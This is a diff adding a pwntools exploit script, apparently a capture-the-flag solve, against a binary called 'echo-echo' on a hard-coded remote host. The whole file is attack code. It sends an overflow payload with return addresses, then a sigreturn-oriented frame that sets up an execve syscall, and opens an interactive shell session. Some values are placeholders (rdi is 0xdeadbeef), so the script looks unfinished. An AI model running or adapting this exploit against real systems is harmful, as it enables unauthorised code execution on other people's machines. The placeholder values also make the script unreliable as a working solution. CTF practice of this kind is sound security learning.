@@ -1,0 +1,55 @@
+#!/usr/bin/python2
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF('./echo-echo')
+context.terminal = ["tilix","-a","session-add-right","-e"]
+
+host = args.HOST or '3.97.113.25'
+port = int(args.PORT or 9002)
+
+def start_local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def start_remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
+gdbscript = '''
+b *_start+29
+continue
+'''.format(**locals())
+
+# -- Exploit goes here --
+
+io = start()
+syscall = 0x000000000040009b
+frame = SigreturnFrame(kernel='amd64')
+frame.rip = syscall
+frame.rdi = 0xdeadbeef
+frame.rsi = 0
+frame.rdx = 0
+frame.rax = 0x3b
+
+rop1 = b"a"*8 + p64(0x0000000000400096)
+io.send(rop1)
+# re()
+print(str(frame))
+rop2 = b"aaaaaaaa" + p64(0x0000000000400060) + str(frame) + p64(0xcafebabe)
+io.send(rop2)
+io.interactive()
+
